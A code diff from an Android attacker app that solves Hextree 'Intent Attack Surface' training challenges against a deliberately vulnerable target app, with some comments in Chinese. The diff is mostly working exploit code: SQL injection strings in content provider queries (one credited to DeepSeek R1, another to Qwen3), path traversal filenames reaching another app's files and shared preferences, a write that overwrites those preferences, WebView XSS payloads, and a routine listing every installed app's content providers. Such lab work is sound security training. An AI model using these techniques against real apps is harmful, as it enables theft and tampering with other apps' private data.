@@ -7,9 +7,12 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.ServiceConnection;
+import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
+import android.content.pm.ProviderInfo;
 import android.database.Cursor;
 import android.net.Uri;
+import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.IBinder;
@@ -26,9 +29,19 @@ import io.hextree.attacksurface.services.IFlag29Interface;
 import androidx.activity.EdgeToEdge;
 import androidx.annotation.Nullable;
 import androidx.appcompat.app.AppCompatActivity;
+import androidx.core.content.FileProvider;
 
+import java.io.BufferedReader;
+import java.io.FileNotFoundException;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.io.OutputStream;
 import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
+
+import org.json.JSONException;
+import org.json.JSONObject;
 
 public class MainActivity extends AppCompatActivity {
     private MyReceiver myReceiver = new MyReceiver();
@@ -148,8 +161,8 @@ public class MainActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         EdgeToEdge.enable(this);
         setContentView(R.layout.activity_main);
-        String hello = "222";
 
+        dumpContentProvider();
         //solve Flag17Receiver
         Intent intent17 = new Intent("io.hextree.broadcast.MALICIOUS");
         intent17.putExtra("flag", "give-flag-17");
@@ -209,7 +222,6 @@ public class MainActivity extends AppCompatActivity {
 
             }
         });
-
 
         Button btn5 = findViewById(R.id.btn5);
         btn5.setOnClickListener(new View.OnClickListener() {
@@ -354,7 +366,9 @@ public class MainActivity extends AppCompatActivity {
         IntentFilter intentFilter = new IntentFilter();
         intentFilter.addAction("io.hextree.broadcast.FREE_FLAG");
 //        ComponentName componentName = new ComponentName(this, MyBroadcastReceiver.class);
-        registerReceiver(myReceiver, intentFilter,RECEIVER_EXPORTED);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            registerReceiver(myReceiver, intentFilter,RECEIVER_EXPORTED);
+        }
 
         //solve Flag19Widget
         Intent intent19 = new Intent("io.hextree.attacksurface.APPWIDGET_UPDATE");
@@ -394,7 +408,9 @@ public class MainActivity extends AppCompatActivity {
         };
         IntentFilter intentFilter21 = new IntentFilter();
         intentFilter21.addAction("io.hextree.broadcast.GIVE_FLAG");
-        registerReceiver(broadcastReceiver, intentFilter21,RECEIVER_EXPORTED);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            registerReceiver(broadcastReceiver, intentFilter21,RECEIVER_EXPORTED);
+        }
 
         //solve Flag24Service
         Button btn24 = findViewById(R.id.btn24);
@@ -568,6 +584,7 @@ public class MainActivity extends AppCompatActivity {
             }
         };
 
+        //solve Flag29
         Button btn29 = findViewById(R.id.btn29);
         btn29.setOnClickListener(new View.OnClickListener() {
             @Override
@@ -579,6 +596,7 @@ public class MainActivity extends AppCompatActivity {
             }
         });
 
+        //solve Flag30
         Button btn30 = findViewById(R.id.btn30);
         btn30.setOnClickListener(new View.OnClickListener() {
             @Override
@@ -593,6 +611,7 @@ public class MainActivity extends AppCompatActivity {
             }
         });
 
+        //solve Flag31
         Button btn31 = findViewById(R.id.btn31);
         btn31.setOnClickListener(new View.OnClickListener() {
             @Override
@@ -603,13 +622,22 @@ public class MainActivity extends AppCompatActivity {
             }
         });
 
+        //solve Flag32
         Button btn32 = findViewById(R.id.btn32);
         btn32.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
+                //构造 selection 参数和 projection 参数，让 SQL 语句执行错误，从而分析得到执行的 SQL 语句是什么
+                //deepseek R1执行结果
                 Cursor cursor = getContentResolver().query(Uri.parse("content://io.hextree.flag32/flags")
                         ,null,"1=1) OR name='flag32' -- ",
                         null,null);
+
+                //Qwen3-235B-A22B结果 ✅
+                Cursor cursor2 = getContentResolver().query(Uri.parse("content://io.hextree.flag32/flags")
+                        ,null,"0=1) OR (name='flag32' AND visible=0",
+                        null,null);
+
 
                 dumpUri(cursor);
             }
@@ -634,12 +662,13 @@ public class MainActivity extends AppCompatActivity {
                 intent.setAction("io.hextree.FLAG33");
                 intent.setComponent(new ComponentName("io.hextree.attacksurface",
                         "io.hextree.attacksurface.activities.Flag33Activity1"));
-                startActivityForResult(intent,1);
+                startActivityForResult(intent,33);
             }
         });
 
         /*
         利用Flag8Activity获取联系人列表
+        Hijacking Content Provider Access
          */
 
         Button btn_forGetContacts = findViewById(R.id.btn_forGetContacts);
@@ -651,6 +680,61 @@ public class MainActivity extends AppCompatActivity {
             }
         });
 
+        //solve Flag34
+        Button btn34 = findViewById(R.id.btn34);
+        btn34.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                Intent intent = new Intent();
+                intent.setClassName("io.hextree.attacksurface",
+                        "io.hextree.attacksurface.activities.Flag34Activity");
+                intent.putExtra("filename","flags/flag34.txt");
+                startActivityForResult(intent,34);
+
+            }
+        });
+
+        //solve Flag35
+        Button btn35 = findViewById(R.id.btn35);
+        btn35.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                Intent intent = new Intent();
+                intent.setClassName("io.hextree.attacksurface",
+                        "io.hextree.attacksurface.activities.Flag35Activity");
+                /*
+                路径拼接后变成 content://io.hextree.root/root_files/data/data/io.hextree.attacksurface/files/../flag35.txt
+                即 content://io.hextree.root/root_files/data/data/io.hextree.attacksurface/flag35.txt
+                 */
+
+                intent.putExtra("filename","../flag35.txt");
+                startActivityForResult(intent,35);
+
+            }
+        });
+
+        //第一次打开 Intent Attack Surface，由于SharedPreferences有缓存机制会使用旧的内容，重新打开Intent Attack Surface后点击 Flag36Activity 就可以获取 Flag 了
+        //solve Flag36
+        Button btn36 = findViewById(R.id.btn36);
+        btn36.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                Intent intent = new Intent();
+                intent.setClassName("io.hextree.attacksurface",
+                        "io.hextree.attacksurface.activities.Flag35Activity");
+                /*
+                路径拼接后变成 content://io.hextree.root/root_files/data/data/io.hextree.attacksurface/files/../flag35.txt
+                即 content://io.hextree.root/root_files/data/data/io.hextree.attacksurface/flag35.txt
+                 */
+
+                intent.putExtra("filename","../shared_prefs/Flag36Preferences.xml");
+                startActivityForResult(intent,36);
+
+            }
+        });
+
+
+        //solve Flag38
         Button btn38 = findViewById(R.id.btn38);
         btn38.setOnClickListener(new View.OnClickListener() {
             @Override
@@ -659,6 +743,43 @@ public class MainActivity extends AppCompatActivity {
                 intent.setClassName("io.hextree.attacksurface",
                         "io.hextree.attacksurface.webviews.Flag38WebViewsActivity");
                 intent.putExtra("URL","data:text/html,<script>hextree.success(true)</script>");
+//                intent.putExtra("URL", "https://cn.bing.com");
+                startActivity(intent);
+            }
+        });
+
+        //solve Flag39
+        Button btn39 = findViewById(R.id.btn39);
+        btn39.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                Intent intent = new Intent();
+                intent.setClassName("io.hextree.attacksurface",
+                        "io.hextree.attacksurface.webviews.Flag39WebViewsActivity");
+                JSONObject jsonObject = new JSONObject();
+                intent.putExtra("NAME","<img src=0 onerror=\"hextree.success()\">");
+                startActivity(intent);
+                String extra = "Neo";
+//                try {
+//                    jsonObject.put("NAME",extra);
+//                } catch (JSONException e) {
+//                    throw new RuntimeException(e);
+//                }
+//                Log.d("JsonObject: ", jsonObject.toString());
+
+            }
+        });
+
+        //solve Flag40
+        Button btn40 = findViewById(R.id.btn40);
+        btn40.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                Intent intent = new Intent();
+                intent.setClassName("io.hextree.attacksurface",
+                        "io.hextree.attacksurface.webviews.Flag40WebViewsActivity");
+                Log.d("Flag40", getApplicationInfo().nativeLibraryDir);
+                intent.putExtra("URL",getApplicationInfo().nativeLibraryDir+"/1.html");
                 startActivity(intent);
             }
         });
@@ -668,13 +789,65 @@ public class MainActivity extends AppCompatActivity {
     @Override
     protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
-       if(requestCode == 1 && resultCode == -1){
+       if(requestCode == 33 && resultCode == -1){
 //            Toast.makeText(this, "get into onActivityResult", Toast.LENGTH_SHORT).show();
             Cursor cursor = getContentResolver().query(data.getData(),
                     null,"1=1 UNION SELECT _id, title, content, 0 FROM note",
                     null,null);
 
             dumpUri(cursor);
+        }
+
+       //solve Flag34
+       if (requestCode == 34 && resultCode == 0){
+           Log.d("Flag34 Uri", data.getData().toString());
+           try {
+               InputStream inputStream = getContentResolver().openInputStream(data.getData());
+               BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
+               String line;
+               while ((line = reader.readLine()) != null){
+                   Log.d("Flag34 File ", "[*] " + line);
+               }
+           } catch (FileNotFoundException e) {
+               throw new RuntimeException(e);
+           } catch (IOException e) {
+               throw new RuntimeException(e);
+           }
+       }
+
+       //solve Flag35
+        if (requestCode == 35 && resultCode == 0){
+            Log.d("Flag35 Uri", data.getData().toString());
+            try {
+                InputStream inputStream = getContentResolver().openInputStream(data.getData());
+                BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
+                String line;
+                while ((line = reader.readLine()) != null){
+                    Log.d("Flag35 File ", "[*] " + line);
+                }
+            } catch (FileNotFoundException e) {
+                throw new RuntimeException(e);
+            } catch (IOException e) {
+                throw new RuntimeException(e);
+            }
+        }
+
+        //solve Flag36
+        if (requestCode == 36 && resultCode == 0){
+            Log.d("Flag36 Uri", data.getData().toString());
+            try {
+                String newContent = "<?xml version='1.0' encoding='utf-8' standalone='yes' ?>\n" +
+                        "<map>\n" +
+                        "    <boolean name=\"solved\" value=\"true\" />\n" +
+                        "</map>\n";
+
+                OutputStream out = getContentResolver().openOutputStream(data.getData());
+                assert out != null;
+                out.write(newContent.getBytes());
+                out.close();
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
         }
     }
 
@@ -689,8 +862,20 @@ public class MainActivity extends AppCompatActivity {
                     }
                     sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
                 }
-                Log.d("evil", sb.toString());
+                Log.d("ContentProvider dumpUri", sb.toString());
             } while (cursor.moveToNext());
+        }
+    }
+    public void dumpContentProvider(){
+
+        for(PackageInfo pkg : getPackageManager().getInstalledPackages(PackageManager.GET_PROVIDERS)){
+            if(pkg.providers != null){
+                for(ProviderInfo provider : pkg.providers){
+                    Log.i("dumpContentProvider",pkg.packageName +" implements " + provider.authority);
+                }
+            }
+
+
         }
     }
 
